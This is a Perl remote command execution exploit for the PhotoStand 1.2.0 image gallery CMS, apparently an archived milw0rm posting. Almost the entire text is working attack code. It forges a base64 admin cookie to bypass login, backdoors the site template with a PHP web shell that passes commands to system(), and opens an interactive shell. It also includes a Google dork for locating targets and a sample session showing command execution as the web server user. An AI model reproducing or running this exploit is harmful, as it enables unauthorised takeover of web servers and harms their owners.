<html><head><title>PhotoStand 1.2.0 Remote Command Execution Exploit </title></head><pre>#!/usr/bin/perl

# App  : PhotoStand 1.2.0
# Site : http://www.photostand.org
# Remote Command Execution Exploit
# Credits to : Giovanni Buzzin, &quot;Osirys&quot;
# osirys[at]autistici[dot]org
# Greets: drosophila, emgent, Fireshot

# PhotoStand is a used Image Gallery CMS.
# PhotoStand is vulnerable to SQL Injection, (AUTH BYPASS), creating a cookie with the nick of the admin encoded in BASE64,
# a remote user is able to become Admin. The exploit just bypass the login, and edits the template putting in it code prone
# to RCE. It doesn't change anything, in fact it gets the previous template, and just adds the hell code.
# ENJOY

# Google Dork: powered by PhotoStand  Design by Vlad

# -------------------------------------------------------------------------------------
# Exploit tested in Local :
# -------------------------------------------------------------------------------------
# osirys[~]&gt;$ perl r0x.txt http://localhost/photostand_1.2.0/photostand_1.2.0/ admin
#
#   ----------------------------
#      Photobase RCE Exploit
#         Coded by Osirys
#   ----------------------------
#
# [*] Bypassing Admin Login with a evil cookie !
# [+] SESSION ID grabbed: sbt9f85ps9n29an2d31911n806
# [*] Admin Login Bypassed !
# [*] Template source Found, editing it ..
# [*] Template edited, backdoored !!
# [*] Shell succesfully spawned !!
# [:D Hi myLord, execute your commands !!
#
# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; pwd
# /home/osirys/web/photostand_1.2.0/photostand_1.2.0/templates/Simplified
# shell[localhost]$&gt; exit
# [-] Quitting ..
#
# osirys[~]&gt;$
# -------------------------------------------------------------------------------------

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use URI::Escape;
use MIME::Base64;

my $host  =  $ARGV[0];
my $user  =  $ARGV[1];
my $rand  =  int(rand 150);
my $rand1 =  &quot;1337&quot;.$rand;
my $rce   =  &quot;&lt;?php if(isset(§§§_GET[cmd])) {echo \&quot;&lt;br&gt;$rand1&lt;br&gt;\&quot;;system(§§§_GET[cmd]);echo \&quot;$rand1&lt;br&gt;\&quot;;}?&gt;&quot;;
my $rce_p =  &quot;/templates/Simplified/index.php?cmd=&quot;;

chomp($user);
$cookie = encode_base64($user);
$cookie =~ s/\%([A-Fa-f0-9]{2})/pack('C', hex($1))/seg;
$cookie =~ s/([^A-Za-z0-9])/sprintf(&quot;%%%02X&quot;, ord($1))/seg;

help(&quot;-1&quot;) unless (($host)&amp;&amp;($user));
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_data($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print &quot;[*] Bypassing Admin Login with a evil cookie !\n&quot;;
socket_req(&quot;GET&quot;,$path.&quot;/admin/index.php&quot;,$cookie,&quot;&quot;,1);
$phpsessid || die &quot;\n[-] Can't login with evil Cookie !\n\n&quot;;
$cookie .= &quot;; PHPSESSID=&quot;.$phpsessid;
socket_req(&quot;GET&quot;,$path.&quot;/admin/newart.php&quot;,$cookie,&quot;&quot;,2,&quot;New article&lt;\/title&gt;&quot;);
$gotcha == 1 || die &quot;\n[-] Can't login with evil Cookie !\n\n&quot;;
print &quot;[*] Admin Login Bypassed !\n&quot;;
socket_req(&quot;GET&quot;,$path.&quot;/admin/options.php?page=editor&amp;edit=Simplified&quot;,$cookie,&quot;&quot;,3);

my $re = join '', @tmp_out;
my $content = tag($re);
if ($content =~ /class=&quot;textbox&quot;&gt;(.+)&lt;\/textarea&gt;/) {
    $template = $1;
    print &quot;[*] Template source Found, editing it ..\n&quot;;
}
else {
    print &quot;[-] Template source not Found, exiting ..\n&quot;;
    exit(0);
}

$template =~ s/(.+)/$rce$1/;
$template =~ s/\*/\n/g;
$template =~ s/\$/ /g;
$template =~ s/§§§/\$/g;
$template =~ s/\( _GET/(\$_GET/g;
my $code = uri_escape($template);
$code =~ s/\(/%28/g;
$code =~ s/\)/%29/g;
$code =~ s/%20/+/g;
$code =~ s/'/%27/g;
$code =~ s/!/%21/g;

my $post = &quot;action=save&amp;tpid=4&amp;tp=index.php&amp;template=Simplified&amp;type=1&amp;page=editor&amp;editpage=&quot;.$code;
socket_req(&quot;POST&quot;,$path.&quot;/admin/options.php&quot;,$cookie,$post,0,&quot;&quot;,1);

my $exec_url = ($host.$rce_p.&quot;id&quot;);
my $re = get_req($exec_url);
if ($re =~ /uid=/) {
    print &quot;[*] Template edited, backdoored !!\n[*] Shell succesfully spawned !!\n[:D Hi myLord, execute your commands !!\n\n&quot;;
    &amp;exec_cmd;
}
else {
    print &quot;[-] Something wrong, sploit failed !\n\n&quot;;
    exit(0);
}

sub socket_req() {
    my($request,$path,$cookie,$content,$opt,$regexp,$sock_opt) = @_;
    my $stop;
    my $length = length($content);
    my $socket   =  new IO::Socket::INET(
                                            PeerAddr =&gt; $h0st,
                                            PeerPort =&gt; '80',
                                            Proto    =&gt; 'tcp',
                                         ) or die $!;

    if ($sock_opt == 1) {
        $opt_1 = &quot;Referer: &quot;.$host.&quot;/admin/options.php?page=editor&amp;edit=Simplified\r\n&quot;;
        $opt_2 = &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    }
    else {
        $opt_1 = &quot;&quot;;
        $opt_2 = &quot;&quot;;
    }
    my $data = $request.&quot; &quot;.$path.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               $opt_1.
               &quot;Cookie: PS-SAVE=&quot;.$cookie.&quot;\r\n&quot;.
               $opt_2.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $content.&quot;\r\n&quot;;

    $socket-&gt;send($data);
    while ((my $e = &lt;$socket&gt;)&amp;&amp;($stop != 1)) {
        if ($opt == 0) {
            $stop = 1;
        }
        elsif ($opt == 1) {
            if ($e =~ /Set-Cookie: PHPSESSID=([0-9a-z]{1,50});/) {
                $phpsessid = $1;
                print &quot;[+] SESSION ID grabbed: $phpsessid\n&quot;;
                $stop = 1;
            }
        }
        elsif ($opt == 2) {
            if ($e =~ /$regexp/) {
                ($stop,$gotcha) = (1,1);
            }
        }
        elsif ($opt == 3) {
            push(@tmp_out,$e);
        }

    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n\n&quot;;
    $exec_url = $host.$rce_p.$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ m/&lt;br&gt;$rand1&lt;br&gt;(.+)$rand1&lt;br&gt;/g) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print &quot;$out\n&quot;;
        &amp;exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;exec_cmd;
    }

}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua  = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_data() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $h0st !~ /www/ || $h0st =~ s/www\.//;
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print &quot;\n&quot;.
          &quot;  ---------------------------- \n&quot;.
          &quot;     PhotoStand RCE Exploit    \n&quot;.
          &quot;         Coded by Osirys       \n&quot;.
          &quot;  ---------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad Input!\n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path admin_username\n&quot;;
    print &quot;    admin_username is the nick of the admin.\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-03-26]</pre></html>